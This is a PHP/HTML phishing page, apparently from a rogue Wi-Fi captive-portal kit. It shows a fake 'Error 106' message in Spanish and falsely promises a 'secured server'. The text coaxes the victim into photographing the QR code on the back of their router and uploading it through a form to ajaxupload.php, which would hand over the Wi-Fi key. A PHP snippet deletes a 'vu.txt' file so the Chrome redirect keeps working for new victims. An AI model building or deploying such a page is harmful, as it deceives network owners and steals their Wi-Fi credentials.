<?php
// on enlève le fichier vu.txt pour ne pas empécher la redirection sur chrome en cas de nouvelle connexion.
  
$file_pointer = "vu.txt"; 
  
// Use unlink() function to delete a file 
if (!unlink($file_pointer)) { 
    echo ("$file_pointer cannot be deleted due to an error"); 
} 
else { 
    echo (""); 
}
?> 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Auth needed</title>

<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/> 
<script type="text/javascript" src="js/jquery-1.11.3-jquery.min.js"></script>
<script type="text/javascript" src="script.js"></script>
<style>
    h2 { color: #000000;
font-family:sans-serif;
}
  </style>
</head>
<body>
<IMG class="displayed" src="qrcode1.png" height="150" width="200">
<br>
<p style="color:#808080;">Error 106 : no se puede conectar, para segurar la conexión hay que tomar foto del codigo QR y poder usar lo con los otros dispositivos que quieren conectarse a la red <b>sin tener que entrar la clave wifi para cada uno de ellos.</b>El codigo QR esta atrás del router.</p>
<br>
<body>
<p style="color:#808080;">Usted tiene que apoyar el botón <b>Elegir fichero</b> para tomar foto del codigo QR, <b>no hay que moverse durante la foto.</b>Una vez la foto hecha, apoya <b>Upload.</b>Si no funciona, no se cierra la pantalla para usar la camara foto del móvil y tomar foto del codigo QR.Una vez la foto hecha se elige el fichero dentro la galería para enviar la a la verificación del servidor securizado con <b>Upload.</b></p>
	<center><IMG class="displayed" src="qrcode.png"></center>
	<br>
<div class="container">
<div class="row">
<div class="col-md-8">
<form id="form" action="ajaxupload.php" method="post" enctype="multipart/form-data">
<input id="uploadImage" type="file" name="image" />
<div id="preview"><img src="filed.png" /></div><br>
<input class="btn btn-success" type="submit" value="Upload">
</form>
<div id="err"></div>
</br>
</br>
</body>
</html>
